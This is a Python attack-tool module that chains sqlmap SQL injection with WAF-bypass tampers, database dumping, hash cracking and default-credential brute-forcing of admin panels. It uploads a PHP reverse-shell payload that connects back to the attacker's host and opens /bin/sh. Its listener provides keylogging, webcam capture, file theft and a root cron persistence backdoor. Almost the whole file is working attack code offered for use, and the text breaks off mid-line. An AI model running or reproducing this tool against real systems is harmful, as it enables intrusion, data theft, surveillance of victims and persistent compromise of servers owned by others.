#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import subprocess
import shutil
import time
import re
import tempfile
import requests
import threading
import socket
import base64
import struct
from typing import Dict, Any
from urllib.parse import urljoin

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box
from tqdm import tqdm

console = Console()
requests.packages.urllib3.disable_warnings()

# ==================== MODULE INFO ====================
MODULE_INFO = {
    "name": "SQLMap Super + Custom Meterpreter",
    "author": "Lynx Saiko",
    "description": "SQLMap + crack + login + custom meterpreter (no MSF).",
    "rank": "excellent",
    "platform": "multi",
    "arch": "multi"
}

# ==================== MODES ====================
SQLMAP_MODES = {
    "detect_db":      {"cmd": "--batch --dbs", "desc": "Detect & list databases"},
    "detect_vuln":    {"cmd": "--batch --risk=1 --level=1 --test-filter=AND boolean-based blind,OR boolean-based blind,time-based blind --technique=B,T", "desc": "Fast Scan Boolean + Time"},
    "detect_vuln_full": {"cmd": "--forms --batch --level=3 --risk=1 --crawl=2", "desc": "Full Scan form + All (slow)"},
    "detect_tables":  {"cmd": "auto", "desc": "AUTO: Detect DB → List tables"},
    "list_tables":    {"cmd": "--batch -D {db} --tables", "desc": "List tables in DB"},
    "dump_table":     {"cmd": "--batch -D {db} -T {table} --dump", "desc": "Dump + METERPRETER"},
    "dump_all":       {"cmd": "--batch --dump-all", "desc": "Dump all + METERPRETER"},
    "os_shell":       {"cmd": "--batch --os-shell", "desc": "OS shell"},
    "sql_shell":      {"cmd": "--batch --sql-shell", "desc": "SQL shell"},
    "show_vuln":      {"cmd": "list_vulnerable_urls", "desc": "Tampilkan riwayat semua URL rentan yang ditemukan"}
}

MODE_CHOICES = list(SQLMAP_MODES.keys()) + ["list"]

OPTIONS = {
    "URL": {"description": "Target URL", "required": True, "default": ""},
    "LHOST": {"description": "Your IP", "required": False, "default": "0.0.0.0"},
    "LPORT": {"description": "Your Port", "required": False, "default": "4444"},
    "MODE": {"description": "Mode Check Vulnerability", "required": True, "default": "", "choices": MODE_CHOICES},
    "DB": {"description": "DB name", "required": False, "default": ""},
    "TABLE": {"description": "Table name", "required": False, "default": ""},
    "LEVEL": {"description": "Level (1-5)", "required": False, "default": "3"},
    "RISK": {"description": "Risk (1-3)", "required": False, "default": "1"},
    "UPLOAD_PATH": {"description": "Jalur Upload Meterpreter (e.g., /images/)", "required": False, "default": ""},
}

# ==================== CUSTOM METERPRETER PAYLOAD (FIXED {{}} ) ====================
METER_PHP = '''<?php
set_time_limit(0);
$ip = "{{lhost}}"; $port = {{lport}};
$sock = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { exit; }

$descriptors = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);
$proc = proc_open("/bin/sh -i", $descriptors, $pipes);
if (!$proc) { fclose($sock); exit; }

stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (true) {
    $read = array($sock, $pipes[1], $pipes[2]);
    $write = NULL; $except = NULL;
    if (@stream_select($read, $write, $except, 0) === false) break;

    if (in_array($sock, $read)) {
        $input = fread($sock, 1024);
        if ($input === false || feof($sock)) break;
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read)) {
        $output = fread($pipes[1], 1024);
        if ($output !== false) fwrite($sock, $output);
    }
    if (in_array($pipes[2], $read)) {
        $error = fread($pipes[2], 1024);
        if ($error !== false) fwrite($sock, $error);
    }
}
fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
proc_close($proc);
?>'''

# ==================== GET VALID LHOST ====================
def _get_valid_lhost() -> str:
    """Dapatkan IP address yang valid untuk binding"""
    try:
        # Coba dapatkan IP local
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            return local_ip
    except:
        pass
    
    try:
        # Coba binding ke semua interfaces
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        if local_ip and local_ip != "127.0.0.1":
            return local_ip
    except:
        pass
    
    # Fallback ke localhost
    return "127.0.0.1"

# ==================== FUNGSI PORT FIX ====================
def _get_available_port(start_port=4444, max_attempts=50):
    """Cari port yang benar-benar tersedia dengan socket reuse"""
    for port in range(start_port, start_port + max_attempts):
        s = None
        try:
            # Buat socket dengan SO_REUSEADDR
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            
            # Dapatkan port yang sebenarnya digunakan
            actual_port = s.getsockname()[1]
            console.print(f"[green]✅ Port {actual_port} is available[/]")
            s.close()
            return actual_port
            
        except OSError as e:
            if s:
                s.close()
            if "Address already in use" in str(e):
                console.print(f"[dim]Port {port} is in use, trying next...[/]")
                continue
            else:
                console.print(f"[yellow]⚠️ Port {port} error: {e}[/]")
                continue
        except Exception as e:
            if s:
                s.close()
            console.print(f"[yellow]⚠️ Port {port} check failed: {e}[/]")
            continue
    
    console.print(f"[red]❌ No available ports found in range {start_port}-{start_port + max_attempts}[/]")
    return start_port  # Fallback

def _kill_existing_listeners(port):
    """Kill processes yang menggunakan port tertentu (Linux/Mac)"""
    try:
        # Cari PID yang menggunakan port
        result = subprocess.run(
            f"lsof -ti:{port}", 
            shell=True, 
            capture_output=True, 
            text=True
        )
        
        if result.stdout.strip():
            pids = result.stdout.strip().split('\n')
            for pid in pids:
                if pid.strip():
                    console.print(f"[yellow]⚠️ Killing existing process on port {port}: PID {pid}[/]")
                    subprocess.run(f"kill -9 {pid}", shell=True, capture_output=True)
                    time.sleep(1)
                    
    except Exception as e:
        console.print(f"[dim]Cannot kill processes on port {port}: {e}[/]")

# ==================== CUSTOM METERPRETER LISTENER (FIXED PORT BINDING) ====================
class CustomMeterpreter:
    def __init__(self, lhost: str, lport: int):
        # ✅ FIX: Validasi dan konversi LHOST & LPORT
        self.lhost = self._validate_lhost(lhost)
        self.lport = int(lport)  # Pastikan integer
        self.sock = None
        self.client = None
        self.keylog = []
        self.screenshot_dir = "/tmp"
        self.persistence_file = "/etc/cron.d/meter_backdoor"
        self.log_file = "meterpreter_session.log"

    def _validate_lhost(self, lhost: str) -> str:
        """Validasi LHOST dan return IP yang valid"""
        if not lhost or lhost == "0.0.0.0":
            # Auto-detect IP jika tidak diset
            detected_ip = _get_valid_lhost()
            console.print(f"[yellow]⚠️  LHOST tidak diset, menggunakan: {detected_ip}[/]")
            return detected_ip
        
        # Test jika IP valid
        try:
            socket.inet_aton(lhost)
            return lhost
        except socket.error:
            # Jika bukan IP valid, coba resolve hostname
            try:
                resolved_ip = socket.gethostbyname(lhost)
                console.print(f"[green]✅ Hostname {lhost} resolved ke: {resolved_ip}[/]")
                return resolved_ip
            except:
                console.print(f"[red]❌ LHOST {lhost} tidak valid![/]")
                detected_ip = _get_valid_lhost()
                console.print(f"[yellow]⚠️  Fallback ke: {detected_ip}[/]")
                return detected_ip

    def _cleanup_sockets(self):
        """Bersihkan socket dengan benar"""
        try:
            if self.client:
                self.client.close()
                self.client = None
        except:
            pass
        
        try:
            if self.sock:
                self.sock.close()
                self.sock = None
        except:
            pass

    def start(self):
        def listener():
            time.sleep(2)
            console.print(f"[bold cyan]LISTENER AKTIF → {self.lhost}:{self.lport}[/]")
            console.print(f"[bold yellow]Menunggu koneksi... (maksimal 3 menit)[/]")

            # Reset socket
            self.sock = None
            self.client = None
            
            try:
                # ✅ FIX: Buat socket dengan SO_REUSEADDR
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Set socket options untuk menghindari TIME_WAIT
                try:
                    self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                except:
                    pass

                console.print(f"[dim]Binding ke {self.lhost}:{self.lport}[/]")
                self.sock.bind((self.lhost, self.lport))
                self.sock.listen(1)
                self.sock.settimeout(180)  # 3 MENIT
                
                console.print(f"[green]✅ Binding berhasil di {self.lhost}:{self.lport}[/]")
                console.print(f"[bold green]📡 LISTENER AKTIF - Menunggu koneksi...[/]")
                
                self.client, addr = self.sock.accept()
                print('\a')  # BEEP!
                console.print(f"[bold green]🎉 SESSION DITERIMA → {addr[0]}[/]")
                self.log(f"Session dari {addr[0]}")
                self.interactive()
                
            except socket.timeout:
                console.print("[red]⏰ Timeout: Target tidak connect dalam 3 menit[/]")
            except OSError as e:
                if "Address already in use" in str(e):
                    console.print(f"[red]❌ Port {self.lport} sudah digunakan![/]")
                    console.print(f"[yellow]💡 Mencari port baru...[/]")
                    
                    # **FIX: Cari port baru**
                    time.sleep(2)
                    new_port = _get_available_port(self.lport + 1)
                    if new_port != self.lport:
                        console.print(f"[green]🔄 Beralih ke port {new_port}[/]")
                        self.lport = new_port
                        # Restart listener dengan port baru
                        self.start()
                        return
                elif "Cannot assign requested address" in str(e):
                    console.print(f"[red]❌ Tidak bisa binding ke {self.lhost}:{self.lport}[/]")
                    console.print(f"[yellow]💡 Cek LHOST atau gunakan: 0.0.0.0 (semua interface)[/]")
                else:
                    console.print(f"[red]❌ Binding error: {e}[/]")
            except Exception as e:
                console.print(f"[red]❌ Error: {e}[/]")
            finally:
                self._cleanup_sockets()
                console.print("[dim]Listener ditutup[/]")
                    
        t = threading.Thread(target=listener, daemon=True)
        t.start()

    def log(self, msg: str):
        with open(self.log_file, "a") as f:
            f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

    def interactive(self):
        console.print("[bold magenta]meterpreter > Ketik 'help' untuk command[/]")
        self.log("Interactive session dimulai")
        
        try:
            while True:
                try:
                    if not self.client:
                        console.print("[red]❌ Client terputus[/]")
                        break
                        
                    cmd = console.input("[bold magenta]meterpreter > [/]")
                    if not cmd.strip(): continue

                    if cmd.strip() == "help":
                        self.show_help()
                    elif cmd.strip() == "clear":
                        console.clear()
                    elif cmd.strip() == "sysinfo":
                        self.send_cmd("uname -a && whoami && id && pwd && df -h")
                    elif cmd.strip() == "screenshot":
                        self.send_cmd(f"import PIL.ImageGrab as ig; ig.grab().save('{self.screenshot_dir}/s.jpg') 2>/dev/null && echo 'Screenshot saved to {self.screenshot_dir}/s.jpg'")
                    elif cmd.strip() == "webcam_snap":
                        self.send_cmd("fswebcam -r 640x480 /tmp/w.jpg 2>/dev/null && echo 'Webcam saved to /tmp/w.jpg'")
                    elif cmd.startswith("download "):
                        file = cmd.split(' ', 1)[1]
                        self.send_cmd(f"cat {file} 2>/dev/null || echo '[!] File not found'")
                    elif cmd.startswith("upload "):
                        parts = cmd.split(' ', 2)
                        if len(parts) == 3:
                            local, remote = parts[1], parts[2]
                            if os.path.isfile(local):
                                with open(local, 'rb') as f:
                                    data = base64.b64encode(f.read()).decode()
                                self.send_cmd(f"echo '{data}' | base64 -d > {remote} && echo '[+] Uploaded: {remote}'")
                                self.log(f"Uploaded: {local} → {remote}")
                            else:
                                console.print(f"[red][!] File tidak ada: {local}[/]")
                        else:
                            console.print("[yellow]Usage: upload local.txt /remote.txt[/]")
                    elif cmd.strip() == "keylog_start":
                        self.send_cmd("python3 -c 'import pynput.keyboard as k; "
                                     "def on_press(key): open(\"/tmp/.kl\", \"a\").write(str(key)+\"\\n\"); "
                                     "k.Listener(on_press=on_press).start()' 2>/dev/null & echo '[+] Keylogger started'")
                        self.log("Keylogger dimulai")
                    elif cmd.strip() == "keylog_dump":
                        self.send_cmd("cat /tmp/.kl 2>/dev/null || echo '[!] No keys logged'")
                    elif cmd.strip() == "keylog_stop":
                        self.send_cmd("pkill -f pynput 2>/dev/null && echo '[+] Keylogger stopped'")
                        self.log("Keylogger dihentikan")
                    elif cmd.strip() == "persistence":
                        self.send_cmd(
                            f"echo '* * * * * root php /var/www/html/meter.php' > {self.persistence_file} 2>/dev/null; "
                            "echo '[+] Persistence via cron'"
                        )
                        self.log("Persistence ditambahkan")
                    elif cmd.strip() == "getuid":
                        self.send_cmd("whoami && id")
                    elif cmd.strip() == "shell":
                        self.send_cmd("/bin/sh -i")
                    elif cmd.strip() == "exit":
                        self.send_cmd("exit")
                        self.log("Session ditutup")
                        break
                    else:
                        self.send_cmd(cmd)

                    data = self.recv_all()
                    if data:
                        console.print(data)
                        self.log(f"Output: {data[:200]}")
                except (BrokenPipeError, ConnectionResetError):
                    console.print("[red]❌ Koneksi terputus[/]")
                    break
                except Exception as e:
                    console.print(f"[red]Session error: {e}[/]")
                    break
                    
        finally:
            self._cleanup_sockets()
            console.print("[dim]Session closed[/]")

    def show_help(self):
        t = Table(title="[bold cyan]METERPRETER COMMANDS[/]", box=box.DOUBLE)
        t.add_column("Command", style="bold yellow")
        t.add_column("Description")
        t.add_row("sysinfo", "System info + disk")
        t.add_row("screenshot", "Take screenshot")
        t.add_row("webcam_snap", "Take webcam photo")
        t.add_row("download file", "Download file")
        t.add_row("upload local remote", "Upload file")
        t.add_row("keylog_start", "Start keylogger")
        t.add_row("keylog_dump", "Show logged keys")
        t.add_row("keylog_stop", "Stop keylogger")
        t.add_row("persistence", "Add cron backdoor")
        t.add_row("getuid", "Get current user")
        t.add_row("shell", "Interactive shell")
        t.add_row("clear", "Clear screen")
        t.add_row("exit", "Close session")
        console.print(Panel(t, border_style="cyan"))

    def send_cmd(self, cmd: str):
        if self.client:
            self.client.send((cmd + "\n").encode())

    def recv_all(self):
        if not self.client: return ""
        data = ""
        self.client.settimeout(5)
        try:
            while True:
                chunk = self.client.recv(8192).decode(errors='ignore')
                if not chunk: break
                data += chunk
                if len(chunk) < 8192: break
        except:
            pass
        return data.strip()

# ==================== TOOLS ====================
def _find_sqlmap() -> str:
    for p in ["/usr/bin/sqlmap"]:
        if os.path.isfile(p): return p
    s = shutil.which("sqlmap")
    if s: return s
    raise RuntimeError("sqlmap not found!")

def _find_john() -> str:
    p = shutil.which("john")
    if not p: raise RuntimeError("john not found!")
    return p

def _find_hashcat() -> str:
    p = shutil.which("hashcat")
    if not p: raise RuntimeError("hashcat not found!")
    return p

# ==================== CRACK HASH ====================
def _crack_hash(hash_str: str) -> str:
    if len(hash_str) < 10: return None
    with tempfile.NamedTemporaryFile(mode='w', suffix='.hash', delete=False) as f:
        f.write(hash_str + "\n"); hash_file = f.name

    try:
        john = _find_john()
        subprocess.run(f"{john} {hash_file} --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --potfile-disable", shell=True, timeout=15, capture_output=True, check=False)
        r = subprocess.run(f"{john} {hash_file} --show --format=raw-md5", shell=True, capture_output=True, text=True)
        if r.stdout.strip():
            pwd = r.stdout.strip().split(':')[-1]
            os.unlink(hash_file)
            return pwd
    except: pass

    try:
        hashcat = _find_hashcat()
        subprocess.run(f"{hashcat} -m 0 {hash_file} /usr/share/wordlists/rockyou.txt --quiet", shell=True, timeout=20, check=False)
        r = subprocess.run(f"{hashcat} {hash_file} --show", shell=True, capture_output=True, text=True)
        if r.stdout.strip():
            pwd = r.stdout.strip().split(':')[-1]
            os.unlink(hash_file)
            return pwd
    except: pass

    os.unlink(hash_file)
    return None

# ==================== AUTO LOGIN + UPLOAD METERPRETER (FIXED) ====================
def _auto_login_upload_meter(base_url: str, creds: Dict[str, str], lhost: str, lport: str, options: Dict[str, Any]):
    """
    AUTO LOGIN DULU → kemudian UPLOAD meterpreter ke path upload
    """
    upload_path = options.get("UPLOAD_PATH", "").strip()
    
    if not upload_path:
        console.print("[yellow]❌ UPLOAD_PATH tidak diset → skip upload[/]")
        return None

    # ✅ FIX: Validasi dan konversi LPORT
    try:
        lport_int = int(lport)
        if not (1 <= lport_int <= 65535):
            raise ValueError("Port out of range")
    except (ValueError, TypeError) as e:
        console.print(f"[red]❌ LPORT tidak valid! {e}. Gunakan angka 1-65535[/]")
        return None

    console.print(f"[bold red]🚀 UPLOAD_PATH MODE → {upload_path}[/]")
    console.print(f"[bold cyan]🎯 Target: {base_url}{upload_path}[/]")

    # FIXED: Gunakan .replace() yang aman
    meter_code = METER_PHP.replace("{{lhost}}", lhost).replace("{{lport}}", str(lport_int))

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Connection": "close"
    })
    
    # ==================== AUTO LOGIN DULU ====================
    console.print("[bold yellow]🔐 Mencoba Auto Login...[/]")
    
    # Common ADMIN login paths untuk upload
    admin_login_paths = [
        "/admin/login.php", "/admin/", "/admin/index.php", 
        "/administrator/", "/administrator/index.php",
        "/wp-admin/", "/wp-login.php",
        "/user/login", "/login", "/signin",
        "/admin/login", "/admin/auth.php"
    ]
    
    # Common credentials untuk admin panel
    common_creds = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "123456"},
        {"username": "admin", "password": "admin123"},
        {"username": "administrator", "password": "admin"},
        {"username": "test", "password": "test"},
        {"username": "admin", "password": ""}
    ]
    
    logged_in = False
    login_url = ""
    
    # Cari login page untuk admin panel
    for login_path in admin_login_paths:
        test_login_url = urljoin(base_url, login_path)
        console.print(f"[dim]   Try login page: {test_login_url}[/]")
        
        try:
            r = session.get(test_login_url, timeout=8, verify=False)
            if r.status_code == 200:
                # Deteksi login page
                page_lower = r.text.lower()
                if any(x in page_lower for x in ['login', 'password', 'username', 'sign in', 'admin login', 'wp-admin']):
                    login_url = test_login_url
                    console.print(f"[green]   ✅ Login page detect: {login_url}[/]")
                    break
        except:
            continue
    
    # JIKA ADA LOGIN PAGE → COBA LOGIN
    if login_url:
        for cred in common_creds:
            console.print(f"[dim]   Try login: {cred['username']}:{cred['password']}[/]")
            
            # Variasi form field untuk upload/admin panels
            login_data_attempts = [
                {"username": cred["username"], "password": cred["password"], "submit": "login"},
                {"user": cred["username"], "pass": cred["password"], "login": "Login"},
                {"email": cred["username"], "password": cred["password"], "submit": "Sign In"},
                {"uname": cred["username"], "pwd": cred["password"], "submit": "submit"},
                {"admin_user": cred["username"], "admin_pass": cred["password"], "submit": "login"},
                {"log": cred["username"], "pwd": cred["password"], "wp-submit": "Log In"}
            ]
            
            for login_data in login_data_attempts:
                try:
                    r = session.post(login_url, data=login_data, timeout=8, verify=False, allow_redirects=True)
                    
                    # Check login success indicators
                    if any(x in r.url.lower() for x in ['admin', 'dashboard', 'panel']):
                        console.print(f"[bold green]   ✅ LOGIN SUCCES (URL Redirect): {cred['username']}:{cred['password']}[/]")
                        logged_in = True
                        break
                    
                    # Check response content for success
                    resp_lower = r.text.lower()
                    if any(x in resp_lower for x in ['logout', 'dashboard', 'admin panel', 'welcome', 'berhasil login']):
                        console.print(f"[bold green]   ✅ LOGIN SUCCESS (Content): {cred['username']}:{cred['password']}[/]")
                        logged_in = True
                        break
                        
                except Exception as e:
                    continue
            
            if logged_in:
                break
    
    # ==================== CARI UPLOAD PAGE SETELAH LOGIN ====================
    upload_page_url = ""
    if logged_in:
        console.print("[bold yellow]🔍 Search Upload Page...[/]")
        
        # Common upload paths di admin panel
        upload_paths = [
            "/admin/upload.php", "/admin/uploads.php", "/admin/media.php",
            "/admin/files.php", "/admin/images.php", "/admin/add.php",
            "/admin/new.php", "/admin/create.php", "/admin/insert.php",
            "/wp-admin/media-new.php", "/wp-admin/async-upload.php"
        ]
        
        for up_path in upload_paths:
            test_upload_url = urljoin(base_url, up_path)
            console.print(f"[dim]   Check upload page: {test_upload_url}[/]")
            
            try:
                r = session.get(test_upload_url, timeout=8, verify=False)
                if r.status_code == 200:
                    page_lower = r.text.lower()
                    if any(x in page_lower for x in ['upload', 'file', 'image', 'browse', 'choose file']):
                        upload_page_url = test_upload_url
                        console.print(f"[green]   ✅ Upload page detect: {upload_page_url}[/]")
                        break
            except:
                continue
    
    # ==================== UPLOAD METERPRETER ====================
    console.print("[bold yellow][*] Starting Upload Meterpreter...[/]")
    
    uploaded = False
    final_url = ""
    
    # Nama file untuk upload
    filenames = [
        'meter.php', 'shell.php', 'config.php', 'image.php',
        'upload.php', 'files.php', 'media.php', 'test.php',
        'meter.jpg.php', 'shell.phtml', 'meter.php5'
    ]
    
    # JIKA ADA UPLOAD PAGE → UPLOAD VIA FORM
    if upload_page_url:
        console.print(f"[green][*] Upload via form: {upload_page_url}[/]")
        
        for filename in filenames:
            console.print(f"[yellow]   → Upload: {filename}[/]")
            
            # Field names untuk upload form
            for field in ['file', 'image', 'upload', 'files', 'userfile', 'Filedata']:
                files = {field: (filename, meter_code, 'application/x-php')}
                
                try:
                    r = session.post(upload_page_url, files=files, timeout=10, verify=False)
                    
                    if r.status_code == 200:
                        console.print(f"[green]      POST {field} → {r.status_code}[/]")
                        
                        # Cek jika upload sukses
                        if any(x in r.text.lower() for x in ['success', 'uploaded', 'berhasil', 'file uploaded']):
                            console.print(f"[bold green]      ✅ UPLOAD SUCCESS[/]")
                            final_url = urljoin(base_url, upload_path + filename)
                            uploaded = True
                            break
                            
                except Exception as e:
                    console.print(f"[dim]      {field} error: {e}[/]")
            
            if uploaded:
                break
    
    # JIKA TIDAK ADA UPLOAD PAGE → DIRECT UPLOAD KE PATH
    if not uploaded:
        console.print("[yellow]🔄 Direct upload to UPLOAD_PATH...[/]")
        
        upload_url = urljoin(base_url.rstrip("/") + "/", upload_path.lstrip("/"))
        
        for filename in filenames:
            console.print(f"[yellow]   → Direct: {filename}[/]")
            
            # Coba berbagai method upload langsung
            try:
                # Method 1: PUT request
                r = session.put(upload_url + filename, data=meter_code, timeout=8, verify=False)
                if r.status_code in [200, 201, 204]:
                    console.print(f"[green]      PUT → {r.status_code}[/]")
                    final_url = upload_url + filename
                    uploaded = True
                    
                # Method 2: POST langsung
                r = session.post(upload_url + filename, data=meter_code, timeout=8, verify=False)
                if r.status_code in [200, 201]:
                    console.print(f"[green]      POST → {r.status_code}[/]")
                    final_url = upload_url + filename
                    uploaded = True
                    
            except Exception as e:
                console.print(f"[dim]      Direct error: {e}[/]")
            
            if uploaded:
                break
    
    # ==================== VERIFY UPLOAD ====================
    if uploaded and final_url:
        console.print("[bold yellow]🔍 Verifying upload...[/]")
        
        # Test akses file
        for i in range(10):
            try:
                r = session.get(final_url, timeout=5, verify=False)
                if r.status_code == 200:
                    console.print(f"[bold green]🎉 METERPRETER BERHASIL → {final_url}[/]")
                    
                    # ✅ FIX: Gunakan lport_int yang sudah dikonversi
                    meter = CustomMeterpreter(lhost, lport_int)
                    meter.start()
                    
                    # Log session
                    with open("meter_sessions.txt", "a") as f:
                        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} | {lhost}:{lport_int} | {final_url}\n")
                    
                    return final_url
            except:
                time.sleep(1)
    
    console.print("[red]❌ Semua metode upload gagal[/]")
    return None

# ==================== TABEL AWAL PER MODE ====================
def _show_initial_table(mode: str, options: Dict[str, Any]):
    url = options["URL"]
    
    if mode == "detect_vuln":
        t = Table(title="[bold red]MODE: DETECT VULN Fast[/]", box=box.DOUBLE)
        t.add_column("Info", style="bold")
        t.add_column("Value", style="red")
        t.add_row("Target URL", url)
        t.add_row("Test Type", "Boolean-based blind / Time-based")
        t.add_row("Level", str(options.get("LEVEL", "3")))
        t.add_row("Risk", str(options.get("RISK", "1")))
        console.print(Panel(t, border_style="red"))

    elif mode == "detect_vuln_full":
        t = Table(title="[bold red]MODE: DETECT VULN Full[/]", box=box.DOUBLE)
        t.add_column("Info", style="bold")
        t.add_column("Value", style="red")
        t.add_row("Target URL", url)
        t.add_row("Test Type", "Forms + All Techniques")
        t.add_row("Level", str(options.get("LEVEL", "3")))
        t.add_row("Risk", str(options.get("RISK", "1")))
        console.print(Panel(t, border_style="red"))

    elif mode == "detect_tables":
        t = Table(title="[bold yellow]MODE: AUTO DETECT DB TABLES[/]", box=box.ROUNDED)
        t.add_column("Info", style="bold")
        t.add_column("Value", style="yellow")
        t.add_row("Target URL", url)
        t.add_row("Max DB Scanned", "3 (Top)")
        t.add_row("Auto Parsing", "Enhanced")
        console.print(Panel(t, border_style="yellow"))

    elif mode == "list_tables":
        t = Table(title="[bold green]MODE: LIST TABLES IN DB[/]", box=box.MINIMAL)
        t.add_column("Info", style="bold")
        t.add_column("Value", style="green")
        t.add_row("Target URL", url)
        t.add_row("Database", options.get("DB", "-"))
        t.add_row("Expected Output", "Table names only")
        console.print(Panel(t, border_style="green"))

    elif mode == "show_vuln":
        t = Table(title="[bold magenta]MODE: SHOW VULNERABLE URLS[/]", box=box.DOUBLE)
        t.add_column("Info", style="bold")
        t.add_column("Value", style="magenta")
        t.add_row("History", "Menampilkan semua target yang rentan")
        console.print(Panel(t, border_style="magenta"))

# ==================== BUILD CMD ====================
def _build_cmd(options: Dict[str, Any]) -> str:
    mode = options["MODE"].lower()
    
    if mode == "list":
        _show_modes()
        return None

    if mode == "detect_tables":
        return "auto_detect_tables"
    
    if mode == "show_vuln":
        return "display_vulnerable_urls"

    url = options["URL"].strip()
    if not url.startswith("http"):
        if options["MODE"].lower() not in ["detect_vuln", "detect_vuln_full"] and "=" not in url:
             raise ValueError("Valid URL with param required")

    sqlmap = _find_sqlmap()
    level, risk = options.get("LEVEL", "3"), options.get("RISK", "1")
    
    base = f"{sqlmap} -u \"{url}\" --batch --random-agent --skip-waf"
    base += " --tamper=space2comment,randomcase,charencode,apostrophemask,between"
    if level != "1":
        base += f" --level={level}"
    if risk != "1":
        base += f" --risk={risk}"
    base += " --flush-session --keep-alive"
    
    cmd_template = SQLMAP_MODES[mode]["cmd"].format(
        db=options.get("DB", ""), table=options.get("TABLE", "")
    )
    
    return f"{base} {cmd_template}"

# ==================== PARSING VULN ====================
def _parse_vulnerability(output: str) -> tuple:
    vuln = False
    param = ""
    technique = ""
    
    patterns_vuln_param = [
        r"Parameter:\s*([^\s\(]+)\s+\([^\)]+\)\s+is vulnerable",
        r"Parameter:\s*([^\s]+)\s+is vulnerable",
        r"injection point found.*?Parameter:\s*([^\s\(]+)",
        r"the parameter '([^']+)' is vulnerable",
    ]
    
    for p in patterns_vuln_param:
        m = re.search(p, output, re.I | re.DOTALL)
        if m:
            vuln = True
            param = m.group(1).strip()
            param = param.split('(')[0].split(':')[0].split(']')[0].strip()
            break
            
    if not vuln:
        if "is vulnerable to" in output:
             vuln = True
        m_payload = re.search(r"Payload:.+?(\?|&)([^=]+)=", output, re.I | re.DOTALL)
        if m_payload:
            param = m_payload.group(2).strip()
            vuln = True
    
    techniques = {
        "Boolean-based blind": r"boolean-based blind",
        "Time-based blind": r"time-based blind",
        "Error-based": r"error-based",
        "UNION query": r"UNION query",
        "Stacked queries": r"stacked queries"
    }
    
    for tech_name, pattern in techniques.items():
        if re.search(pattern, output, re.I):
            technique = tech_name
            break
            
    if vuln and not technique:
        technique = "Generic SQL Injection"

    return vuln, param, technique

def _is_valid_table_name(name: str) -> bool:
    if not name or len(name) < 2: return False
    invalid_patterns = [r'^\d{2}:\d{2}:\d{2}', r'^y/n/q', r'^\[\*\]', r'^___+', r'^error|warning|info',]
    for pattern in invalid_patterns:
        if re.match(pattern, name, re.IGNORECASE): return False
    if not re.match(r'^[a-zA-Z_][a-zA-Z0-9_]*$', name): return False
    return True

# ==================== RUN SQLMAP ====================
def _run_sqlmap(cmd: str, url: str, session: Dict[str, Any], lhost: str, lport: int, options: Dict[str, Any]):
    mode = options["MODE"].lower()
    session["current_mode"] = mode
    _show_initial_table(mode, options)

    if cmd == "display_vulnerable_urls":
        return "show_vuln_done", False, "", "", None

    timeout_map = {
        "detect_db": 300, "detect_vuln": 240, "detect_vuln_full": 720, "detect_tables": 480, 
        "list_tables": 360, "dump_table": 720, "dump_all": 900, "os_shell": 360, "sql_shell": 360
    }
    timeout = timeout_map.get(mode, 300)
    
    if mode == "detect_db":
        console.print("[bold yellow]SCANNING: Databases...[/]")
        pbar = tqdm(total=100, desc="Detect DB", bar_format="{l_bar}{bar}| {percentage:3.0f}%", ncols=50)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        dbs = []
        for line in proc.stdout:
            line = line.strip()
            if line and not line.startswith("*") and "database" not in line.lower():
                dbs.append(line)
                console.print(f"[green]DB: {line}[/]")
            pbar.update(1)
        proc.wait()
        pbar.close()
        session["detected_dbs"] = dbs
        return "", False, "", "", None

    if mode in ["detect_vuln", "detect_vuln_full"]:
        console.print(f"[bold red]SCANNING: {mode.upper()} (WAF Bypass Active)[/]")
        try:
            timeout_val = timeout_map[mode] 
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout_val)
            full_output = result.stdout + result.stderr
            
            if "WAF" in full_output or "protection mechanism" in full_output:
                console.print("[yellow]WAF Terdeteksi! Mencoba bypass...[/]")
            
            vuln, param, technique = _parse_vulnerability(full_output)
            session["vuln_param"] = param 
            session["tech"] = technique 
            
            if vuln:
                marked = f"[VULN] {url}"
                session.setdefault("vulnerable_urls", []).append(marked)
                console.print(f"[bold red]URL MARKED: {marked}[/]")
            
            return full_output, vuln, param, "", None
            
        except subprocess.TimeoutExpired:
            console.print(f"[red]Timeout setelah {timeout_val} detik.[/]")
            return "", False, "", "", None
        except Exception as e:
            console.print(f"[red]Error: {e}[/]")
            return "", False, "", "", None

    if cmd == "auto_detect_tables":
        console.print("[bold yellow]AUTO DETECT: Database → Tables[/]")
        dbs_cmd = f"{_find_sqlmap()} -u \"{url}\" --dbs --batch --random-agent --threads=10 --tamper=space2comment"
        try:
            dbs_out = subprocess.run(dbs_cmd, shell=True, capture_output=True, text=True, timeout=180).stdout
        except subprocess.TimeoutExpired:
            console.print("[red]Timeout saat mendeteksi DB.[/]")
            return "", False, "", "", None
            
        dbs = [x.strip() for x in re.findall(r"\[\*\]\s+([a-zA-Z0-9_]+)", dbs_out) 
